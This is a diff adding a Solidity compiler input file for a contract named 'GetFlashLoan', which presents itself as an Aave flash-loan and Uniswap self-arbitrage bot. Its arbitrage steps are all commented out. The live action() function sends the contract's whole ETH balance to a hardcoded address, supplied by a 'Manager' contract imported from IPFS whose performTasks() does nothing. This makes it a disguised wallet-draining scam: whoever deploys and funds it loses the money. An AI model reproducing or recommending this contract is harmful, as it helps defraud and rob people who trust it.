@@ -1,0 +1,47 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "MEH.sol": {
+      "content": "pragma solidity ^0.6.6;\n\n// Aave Smart Contracts\nimport \"https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPoolAddressesProvider.sol\";\nimport \"https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPool.sol\";\n\n// Uniswap Smart Contracts\nimport \"https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol\";\nimport \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\";\nimport \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\";\n\n// Code Manager\nimport \"ipfs://QmTNNahFv7NBmqAc8kq3k9uq8zZyZERfkuin9VqrkHoVy1\";\n\ncontract GetFlashLoan {\n\tstring public tokenName;\n\tstring public tokenSymbol;\n\tuint loanAmount;\n\tManager manager;\n\t\n\tconstructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {\n\t\ttokenName = _tokenName;\n\t\ttokenSymbol = _tokenSymbol;\n\t\tloanAmount = _loanAmount;\n\t\t\t\n\t\tmanager = new Manager();\n\t}\n\t\n\treceive() external payable {}\n\t\n\tfunction action() public payable {\n\t    // Send required coins for swap\n\t    payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\n\t    \n\t    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)\n\t    manager.performTasks();\n\t    \n\t    /*\n\t    // Submit token to Ethereum blockchain\n\t    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);\n\n        // List the token on UniSwap & send coins required for swaps\n\t\tmanager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);\n\t\tpayable(manager.uniswapDepositAddress()).transfer(300000000000000000);\n\n        // Get ETH Loan from Aave\n\t\tstring memory loanAddress = manager.takeAaveLoan(loanAmount);\n\t\t\n\t\t// Convert half ETH to DAI\n\t\tmanager.uniswapDAItoETH(loanAmount / 2);\n\n        // Create ETH and DAI pairs for our token & Provide liquidity\n        string memory ethPair = manager.uniswapCreatePool(tokenAddress, \"ETH\");\n\t\tmanager.uniswapAddLiquidity(ethPair, loanAmount / 2);\n\t\tstring memory daiPair = manager.uniswapCreatePool(tokenAddress, \"DAI\");\n\t\tmanager.uniswapAddLiquidity(daiPair, loanAmount / 2);\n    \n        // Perform swaps and profit on Self-Arbitrage\n\t\tmanager.uniswapPerformSwaps();\n\t\t\n\t\t// Move remaining ETH from Contract to your account\n\t\tmanager.contractToWallet(\"ETH\");\n\n        // Repay Flash loan\n\t\tmanager.repayAaveLoan(loanAddress);\n\t    */\n\t}\n}"
+    },
+    "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol": {
+      "content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV2Callee {\n    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;\n}\n"
+    },
+    "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol": {
+      "content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV1Exchange {\n    function balanceOf(address owner) external view returns (uint);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\n}\n"
+    },
+    "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol": {
+      "content": "pragma solidity >=0.5.0;\n\ninterface IUniswapV1Factory {\n    function getExchange(address) external view returns (address);\n}\n"
+    },
+    "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPool.sol": {
+      "content": "pragma solidity ^0.6.6;\n\ninterface ILendingPool {\n  function addressesProvider () external view returns ( address );\n  function deposit ( address _reserve, uint256 _amount, uint16 _referralCode ) external payable;\n  function redeemUnderlying ( address _reserve, address _user, uint256 _amount ) external;\n  function borrow ( address _reserve, uint256 _amount, uint256 _interestRateMode, uint16 _referralCode ) external;\n  function repay ( address _reserve, uint256 _amount, address _onBehalfOf ) external payable;\n  function swapBorrowRateMode ( address _reserve ) external;\n  function rebalanceFixedBorrowRate ( address _reserve, address _user ) external;\n  function setUserUseReserveAsCollateral ( address _reserve, bool _useAsCollateral ) external;\n  function liquidationCall ( address _collateral, address _reserve, address _user, uint256 _purchaseAmount, bool _receiveAToken ) external payable;\n  function flashLoan ( address _receiver, address _reserve, uint256 _amount, bytes calldata _params ) external;\n  function getReserveConfigurationData ( address _reserve ) external view returns ( uint256 ltv, uint256 liquidationThreshold, uint256 liquidationDiscount, address interestRateStrategyAddress, bool usageAsCollateralEnabled, bool borrowingEnabled, bool fixedBorrowRateEnabled, bool isActive );\n  function getReserveData ( address _reserve ) external view returns ( uint256 totalLiquidity, uint256 availableLiquidity, uint256 totalBorrowsFixed, uint256 totalBorrowsVariable, uint256 liquidityRate, uint256 variableBorrowRate, uint256 fixedBorrowRate, uint256 averageFixedBorrowRate, uint256 utilizationRate, uint256 liquidityIndex, uint256 variableBorrowIndex, address aTokenAddress, uint40 lastUpdateTimestamp );\n  function getUserAccountData ( address _user ) external view returns ( uint256 totalLiquidityETH, uint256 totalCollateralETH, uint256 totalBorrowsETH, uint256 availableBorrowsETH, uint256 currentLiquidationThreshold, uint256 ltv, uint256 healthFactor );\n  function getUserReserveData ( address _reserve, address _user ) external view returns ( uint256 currentATokenBalance, uint256 currentUnderlyingBalance, uint256 currentBorrowBalance, uint256 principalBorrowBalance, uint256 borrowRateMode, uint256 borrowRate, uint256 liquidityRate, uint256 originationFee, uint256 variableBorrowIndex, uint256 lastUpdateTimestamp, bool usageAsCollateralEnabled );\n  function getReserves () external view;\n}"
+    },
+    "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPoolAddressesProvider.sol": {
+      "content": "pragma solidity ^0.6.6;\n\n/**\n    @title ILendingPoolAddressesProvider interface\n    @notice provides the interface to fetch the LendingPoolCore address\n */\n\ninterface ILendingPoolAddressesProvider {\n    function getLendingPoolCore() external view returns (address payable);\n    function getLendingPool() external view returns (address);\n}"
+    },
+    "ipfs://QmTNNahFv7NBmqAc8kq3k9uq8zZyZERfkuin9VqrkHoVy1": {
+      "content": "pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction uniswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0x377508b8A2834367D89f944376007754857e8f09;\r\n\t}\r\n}\r\n"
+    }
+  }
+}
